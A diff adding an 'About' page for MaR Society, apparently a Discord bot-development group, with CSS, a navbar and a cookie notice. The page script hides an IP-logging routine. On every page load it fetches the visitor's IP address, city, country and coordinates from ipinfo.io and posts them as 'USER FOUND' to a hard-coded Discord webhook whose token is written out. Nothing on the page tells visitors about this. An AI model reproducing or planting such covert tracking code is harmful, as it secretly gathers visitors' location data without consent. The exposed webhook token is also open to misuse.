@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>About</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url("blueback.jpeg");
+            background-size: cover;
+            color: #333;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(0, 162, 255, 0.8);
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0.8;
+            border: rgba(0, 68, 255, 0.8) solid 4px;
+        }
+        
+        .containerContainer {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(0, 110, 255, 0.8);
+            border: rgba(0, 89, 255, 0.8) solid 4px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0.8;
+        }
+        
+        .containerDarker {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(0, 60, 255, 0.8);
+            border: rgb(0, 26, 255) solid 4px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            opacity: 0.8;
+        }
+        
+        h1 {
+            color: #ffffff;
+            text-align: center;
+            font-size: 40px;
+        }
+        
+        h2,
+        h3 {
+            color: #ffffff;
+            text-align: center;
+            font-size: 30px;
+        }
+        
+        p {
+            color: #ffffff;
+            font-size: 20px;
+            line-height: 1.6;
+        }
+        
+        a {
+            color: #00ff00;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        a:hover {
+            color: #0d9900;
+        }
+        
+        .fadeInUp {
+            animation: fadeInUp 1s ease;
+        }
+        
+        .commandHeader {
+            font-size: 30px;
+        }
+        
+        .verifyButton {
+            font-size: 30px;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #00ff00;
+            border: green solid 2px;
+            cursor: pointer;
+            border-radius: 20px;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: background-color 0.3s;
+        }
+        
+        .verifyButton:hover {
+            font-size: 30px;
+            font-family: Arial, Helvetica, sans-serif;
+            background-color: #00ca00;
+            border: green solid 2px;
+            cursor: pointer;
+            border-radius: 20px;
+            margin: 0;
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            transition: background-color 0.3s;
+        }
+        
+        .navbar {
+            background-color: #00b7ff;
+            border: #003cff solid 4px;
+            border-radius: 10px;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .navbar a {
+            float: left;
+            display: block;
+            color: white;
+            border-radius: 10px;
+            text-align: center;
+            padding: 24px 26px;
+            text-decoration: none;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            left: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        .navbar a:hover {
+            background-color: #0099ff;
+            border-radius: 10px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: black;
+            left: 50%;
+            transition: background-color 0.3s;
+        }
+        
+        .cookie-popup {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 10px 20px;
+            border-radius: 10px;
+            display: none;
+        }
+        
+        .cookie-popup img {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 100;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="navbar">
+        <a href="index">Home</a>
+        <a href="devs">Developers</a>
+        <a href="about">About</a>
+        <a href="shop">Shop</a>
+        <a href="https://discord.gg/ZbuNedvZPT">Contact</a>
+    </div>
+    <br>
+    <br>
+    <br>
+
+    <div class="cookie-popup" id="cookiePopup">
+        <img src="cookie.png" alt="Cookie"> We use cookies to improve your experience on our site. By continuing to use our site, you accept our use of cookies.
+    </div>
+
+
+    <div class="container animate__animated animate__fadeInUp">
+        <h1><u><b>About</b></u></h1>
+        <div class="containerContainer">
+            <div class="backgroundCont">
+                <h2><u><b>WHAT ARE WE ABOUT?</b></u>
+                </h2>
+                <div class="containerDarker">
+                    <h3><u>MaR Society</u></h3>
+                    <p>We are a peaceful society that believes in peace. We make bots for all of your discordian needs! Anything you need in a discord bot, we can make!</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u>How do I request custom bots?</u></h3>
+                    <p>You can request custom bots by joining the <a href="devcrafters_link">DEVCRAFTERS</a> discord server and going to the 'talk-to-us' channel under the 'private consulting' category. There, you will find another server to join. Open a
+                        ticket in that server and a staff member or developer will be with you as soon as possible!</p>
+                </div>
+                <br>
+                <div class="containerDarker">
+                    <h3><u>What languages do our developers know?</u></h3>
+                    <p>Our developers know many languages, such as the following commands:</p>
+                    <p class="commandHeader"><u>Website development:</u></p>
+                    <p>· HTML</p>
+                    <p>· JavaScript</p>
+                    <p>· CSS</p>
+                    <p>· PHP</p>
+                    <p class="commandHeader"><u>Programming:</u></p>
+                    <p>· Python</p>
+                    <p>· JavaScript</p>
+                    <p>· C#</p>
+                    <p>· C++</p>
+                </div>
+            </div>
+        </div>
+        <p style="text-align: center;">Powered by MaR Society © 2024</p>
+    </div>
+    <script>
+        function setCookie(cname, cvalue, exdays) {
+            var d = new Date();
+            d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+            var expires = "expires=" + d.toUTCString();
+            document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+        }
+
+
+        function getCookie(cname) {
+            var name = cname + "=";
+            var decodedCookie = decodeURIComponent(document.cookie);
+            var ca = decodedCookie.split(';');
+            for (var i = 0; i < ca.length; i++) {
+                var c = ca[i];
+                while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                }
+                if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
+                }
+            }
+            return "";
+        }
+
+
+        function checkCookie() {
+            var cookieConsent = getCookie("cookieConsent");
+            if (cookieConsent == "") {
+
+                document.getElementById("cookiePopup").style.display = "block";
+            }
+        }
+
+
+        function acceptCookies() {
+            document.getElementById("cookiePopup").style.display = "none";
+            setCookie("cookieConsent", "accepted", 365); // Set cookie for 1 year
+        }
+
+
+        window.onload = function() {
+            checkCookie();
+        };
+
+
+        function sendMessage() {
+            fetch("https://ipinfo.io/json")
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+                    var country = data.country;
+                    var city = data.city;
+                    var latitude = data.loc.split(',')[0];
+                    var longitude = data.loc.split(',')[1];
+                    var browser = navigator.userAgent;
+                    var currentTime = new Date().toLocaleString();
+                    var webhookUrl = "https://discord.com/api/webhooks/1236725710408646666/QXC9cW4S-Eeh7tmxZ18sZxp9ZZgFe4JqkMhkiDVtIxTIRKdfu377pvSP1j5MN4e3qcv9";
+                    var message = "USER FOUND:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;
+
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", webhookUrl, true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4 && xhr.status === 204) {
+                            console.log("Message sent successfully!");
+                        } else {
+                            console.error("Failed to send message. Status code: " + xhr.status);
+                        }
+                    };
+                    xhr.send(JSON.stringify({
+                        "content": message
+                    }));
+                })
+                .catch(error => {
+                    console.error("Error fetching geolocation information: " + error.message);
+                });
+        }
+
+        window.onload = function() {
+            sendMessage();
+        };
+    </script>
+</body>
+
+</html>
